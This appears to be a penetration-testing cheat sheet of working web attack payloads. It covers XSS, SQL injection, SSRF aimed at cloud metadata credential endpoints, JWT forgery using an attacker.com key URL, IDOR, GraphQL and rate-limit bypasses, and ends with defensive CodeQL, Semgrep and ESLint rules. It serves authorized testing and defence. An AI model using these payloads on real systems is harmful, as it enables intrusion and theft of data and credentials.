# Attack Patterns Reference

Safe, non-destructive test payloads and detection patterns for authorized security testing. All techniques here are for use in authorized penetration tests, CTF challenges, and defensive research only.

---

## XSS Test Payloads

### Reflected XSS

These payloads test whether user input is reflected in HTTP responses without proper encoding. Use in search fields, URL parameters, form inputs, and HTTP headers.

**Basic payloads:**
```
<script>alert(document.domain)</script>
"><script>alert(document.domain)</script>
'><script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<input onfocus=alert(document.domain) autofocus>
<marquee onstart=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
```

**Filter bypass payloads:**
```
<ScRiPt>alert(document.domain)</ScRiPt>
<scr<script>ipt>alert(document.domain)</scr</script>ipt>
<script>alert(String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<svg/onload=alert(document.domain)>
javascript:alert(document.domain)//
```

**URL encoding payloads:**
```
%3Cscript%3Ealert(document.domain)%3C/script%3E
%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
```

**Context-specific payloads:**

Inside HTML attribute:
```
" onmouseover="alert(document.domain)
' onfocus='alert(document.domain)' autofocus='
```

Inside JavaScript string:
```
';alert(document.domain);//
\';alert(document.domain);//
</script><script>alert(document.domain)</script>
```

Inside CSS:
```
expression(alert(document.domain))
url(javascript:alert(document.domain))
```

### Stored XSS

Test these in persistent fields: user profiles, comments, forum posts, file upload names, chat messages.

```
<img src=x onerror=alert(document.domain)>
<a href="javascript:alert(document.domain)">click me</a>
<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
```

### DOM-Based XSS

Look for JavaScript that reads from these sources and writes to dangerous sinks:

**Sources** (attacker-controlled input):
```
document.location
document.location.hash
document.location.search
document.referrer
window.name
document.cookie
localStorage / sessionStorage
postMessage data
```

**Sinks** (dangerous output):
```
element.innerHTML
element.outerHTML
document.write()
document.writeln()
eval()
setTimeout(string)
setInterval(string)
new Function(string)
element.setAttribute("onclick", ...)
location.href = ...
location.assign(...)
```

**Detection pattern:** Search for any code path where a Source flows into a Sink without sanitization.

---

## SQL Injection Detection Patterns

### Detection Payloads

**Error-based detection:**
```
'                          -- Single quote triggers SQL error
"                          -- Double quote
\                          -- Backslash
' OR '1'='1               -- Boolean true
' OR '1'='2               -- Boolean false (compare responses)
' AND 1=1--               -- Boolean true with comment
' AND 1=2--               -- Boolean false (compare responses)
1 OR 1=1                  -- Numeric injection
1 AND 1=2                 -- Numeric false
```

**Union-based enumeration** (authorized testing only):
```sql
-- Step 1: Find column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--             -- Increment until error
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--  -- Match column count

-- Step 2: Find displayable columns
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

-- Step 3: Extract database info
' UNION SELECT version(),NULL,NULL--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Time-based blind injection:**
```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(version(),1,1)='5', SLEEP(5), 0)--

-- PostgreSQL
' AND pg_sleep(5)--
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)--
```

**Boolean-based blind injection:**
```sql
-- Extract data one character at a time
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(username,1,1))>96--
' AND ASCII(SUBSTRING(username,1,1))>109--  -- Binary search
```

### Database-Specific Syntax

| Feature | MySQL | PostgreSQL | MSSQL | SQLite |
|---------|-------|------------|-------|--------|
| String concat | `CONCAT('a','b')` | `'a' \|\| 'b'` | `'a' + 'b'` | `'a' \|\| 'b'` |
| Comment | `-- ` or `#` | `--` | `--` | `--` |
| Version | `VERSION()` | `version()` | `@@version` | `sqlite_version()` |
| Current user | `CURRENT_USER()` | `current_user` | `SYSTEM_USER` | N/A |
| Sleep | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | N/A |

---

## SSRF Detection Techniques

### Basic Payloads

```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]                            -- IPv6 localhost
http://[0000::1]                        -- IPv6 localhost (expanded)
```

### Cloud Metadata Endpoints

```
# AWS EC2 Metadata (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# AWS EC2 Metadata (IMDSv2 — requires token header)
# Step 1: curl -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT http://169.254.169.254/latest/api/token
# Step 2: curl -H "X-aws-ec2-metadata-token: TOKEN" http://169.254.169.254/latest/meta-data/

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Azure Metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token

# DigitalOcean Metadata
http://169.254.169.254/metadata/v1/
```

### Bypass Techniques

**IP encoding tricks:**
```
http://0x7f000001           -- Hex encoding of 127.0.0.1
http://2130706433           -- Decimal encoding of 127.0.0.1
http://0177.0.0.1           -- Octal encoding
http://127.1                -- Shortened
http://127.0.0.1.nip.io     -- DNS rebinding via nip.io
```

**URL parsing inconsistencies:**
```
http://127.0.0.1@evil.com   -- URL authority confusion
http://evil.com#@127.0.0.1  -- Fragment confusion
http://127.0.0.1%00@evil.com -- Null byte injection
http://evil.com\@127.0.0.1  -- Backslash confusion
```

**Redirect chains:**
```
# If the app follows redirects, find an open redirect first:
https://target.com/redirect?url=http://169.254.169.254/
```

---

## JWT Manipulation Patterns

### Decode Without Verification

JWTs are Base64URL-encoded and can be decoded without the secret:
```bash
# Decode header
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# Output: {"alg":"HS256"}

# Decode payload
echo "eyJ1c2VyIjoiYWRtaW4ifQ" | base64 -d
# Output: {"user":"admin"}
```

### Algorithm Confusion Attacks

**None algorithm attack:**
```json
// Original header
{"alg": "HS256", "typ": "JWT"}

// Modified header — set algorithm to none
{"alg": "none", "typ": "JWT"}

// Token format: header.payload. (empty signature)
```

**RS256 to HS256 confusion:**
If the server uses RS256 (asymmetric), try:
1. Get the server's RSA public key (from JWKS endpoint or TLS certificate)
2. Change `alg` to `HS256`
3. Sign the token using the RSA public key as the HMAC secret
4. If the server naively uses the configured key for both algorithms, it will verify the HMAC with the public key

### Claim Manipulation

```json
// Common claims to modify:
{
  "sub": "1234567890",    // Change to another user's ID
  "role": "admin",         // Escalate from "user" to "admin"
  "is_admin": true,        // Toggle admin flag
  "exp": 9999999999,       // Extend expiration far into the future
  "aud": "admin-api",      // Change audience
  "iss": "trusted-issuer"  // Spoof issuer
}
```

### Weak Secret Brute Force

Common JWT secrets to try (if you have a valid token to test against):
```
secret
password
123456
your-256-bit-secret
jwt_secret
changeme
mysecretkey
HS256-secret
```

Use tools like `jwt-cracker` or `hashcat -m 16500` for dictionary attacks.

### JWKS Injection

If the server fetches keys from a JWKS URL in the JWT header:
```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
```
Host your own JWKS with a key pair you control.

---

## API Authorization Testing (IDOR, BOLA)

### IDOR Testing Methodology

**Step 1: Identify resource identifiers**
Map all API endpoints and find parameters that reference resources:
```
GET /api/users/{id}/profile
GET /api/orders/{orderId}
GET /api/documents/{docId}/download
PUT /api/users/{id}/settings
DELETE /api/comments/{commentId}
```

**Step 2: Create two test accounts**
- User A (attacker) and User B (victim)
- Authenticate as both and capture their tokens

**Step 3: Cross-account access testing**
Using User A's token, request User B's resources:
```
# Read
GET /api/users/{B_id}/profile     → Should be 403
GET /api/orders/{B_orderId}       → Should be 403

# Write
PUT /api/users/{B_id}/settings    → Should be 403
PATCH /api/orders/{B_orderId}     → Should be 403

# Delete
DELETE /api/comments/{B_commentId} → Should be 403
```

**Step 4: ID manipulation**
```
# Sequential IDs — increment/decrement
/api/users/100 → /api/users/101

# UUID prediction — not practical, but test for leaked UUIDs
# Check if UUIDs appear in other responses

# Encoded IDs — decode and modify
/api/users/MTAw → base64 decode = "100" → encode "101" = MTAx

# Hash-based IDs — check for predictable hashing
/api/users/md5(email) → compute md5 of known emails
```

### BFLA (Broken Function Level Authorization)

Test access to administrative functions:
```
# As regular user, try admin endpoints:
POST   /api/admin/users                → 403
DELETE /api/admin/users/123            → 403
PUT    /api/admin/settings             → 403
GET    /api/admin/reports              → 403
POST   /api/admin/impersonate/user123  → 403

# Try HTTP method override:
GET /api/admin/users with X-HTTP-Method-Override: DELETE
POST /api/admin/users with _method=DELETE
```

### Mass Assignment Testing

```json
// Normal user update request:
PUT /api/users/profile
{
  "name": "Normal User",
  "email": "user@test.com"
}

// Mass assignment attempt — add privileged fields:
PUT /api/users/profile
{
  "name": "Normal User",
  "email": "user@test.com",
  "role": "admin",
  "is_verified": true,
  "is_admin": true,
  "balance": 99999,
  "subscription": "enterprise",
  "permissions": ["admin", "superadmin"]
}

// Then check if any extra fields were persisted:
GET /api/users/profile
```

---

## GraphQL Security Testing Patterns

### Introspection Query

Use this to map the entire schema (should be disabled in production):
```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType { name kind }
        }
        args { name type { name } }
      }
    }
  }
}
```

### Query Depth Attack

Nested queries can cause exponential resource consumption:
```graphql
{
  users {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                name
              }
            }
          }
        }
      }
    }
  }
}
```

**Mitigation check:** Server should return an error like "Query depth exceeds maximum allowed depth."

### Query Complexity Attack

Wide queries with aliases:
```graphql
{
  a: users(limit: 1000) { name email }
  b: users(limit: 1000) { name email }
  c: users(limit: 1000) { name email }
  d: users(limit: 1000) { name email }
  e: users(limit: 1000) { name email }
}
```

### Batch Query Attack

Send multiple operations in a single request to bypass rate limiting:
```json
[
  {"query": "mutation { login(user:\"admin\", pass:\"pass1\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass2\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass3\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass4\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass5\") { token } }"}
]
```

### Field Suggestion Exploitation

GraphQL often suggests similar field names on typos:
```graphql
{ users { passwor } }
# Response: "Did you mean 'password'?"
```

Use this to discover hidden fields without full introspection.

### Authorization Bypass via Fragments

```graphql
query {
  publicUser(id: 1) {
    name
    ...on User {
      email           # Should be restricted
      ssn             # Should be restricted
      creditCard      # Should be restricted
    }
  }
}
```

---

## Rate Limiting Bypass Techniques

These techniques help verify that rate limiting is robust during authorized testing:

```
# IP rotation — test if rate limiting is per-IP only
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4

# Case variation — test if endpoints are case-sensitive
/api/login
/API/LOGIN
/Api/Login

# Path variation
/api/login
/api/login/
/api/./login
/api/login?dummy=1

# HTTP method variation
POST /api/login
PUT /api/login

# Unicode encoding
/api/logi%6E
```

If any of these bypass rate limiting, the implementation needs hardening.

---

## Static Analysis Tool Configurations

### CodeQL Custom Rules

Write custom CodeQL queries for project-specific vulnerability patterns:

```ql
/**
 * Detect SQL injection via string concatenation
 */
import python
import semmle.python.dataflow.new.DataFlow

from Call call, StringFormatting fmt
where
  call.getFunc().getName() = "execute" and
  fmt = call.getArg(0) and
  exists(DataFlow::Node source |
    source.asExpr() instanceof Name and
    DataFlow::localFlow(source, DataFlow::exprNode(fmt.getAnOperand()))
  )
select call, "Potential SQL injection: user input flows into execute()"
```

### Semgrep Custom Rules

```yaml
rules:
  - id: hardcoded-jwt-secret
    pattern: |
      jwt.encode($PAYLOAD, "...", ...)
    message: "JWT signed with hardcoded secret"
    severity: ERROR
    languages: [python]

  - id: unsafe-yaml-load
    pattern: yaml.load($DATA)
    fix: yaml.safe_load($DATA)
    message: "Use yaml.safe_load() to prevent arbitrary code execution"
    severity: WARNING
    languages: [python]

  - id: express-no-helmet
    pattern: |
      const app = express();
      ...
      app.listen(...)
    pattern-not: |
      const app = express();
      ...
      app.use(helmet(...));
      ...
      app.listen(...)
    message: "Express app missing helmet middleware for security headers"
    severity: WARNING
    languages: [javascript, typescript]
```

### ESLint Security Plugins

Recommended configuration:

```json
{
  "plugins": ["security", "no-unsanitized"],
  "extends": ["plugin:security/recommended"],
  "rules": {
    "security/detect-object-injection": "error",
    "security/detect-non-literal-regexp": "warn",
    "security/detect-unsafe-regex": "error",
    "security/detect-buffer-noassert": "error",
    "security/detect-eval-with-expression": "error",
    "no-unsanitized/method": "error",
    "no-unsanitized/property": "error"
  }
}
```
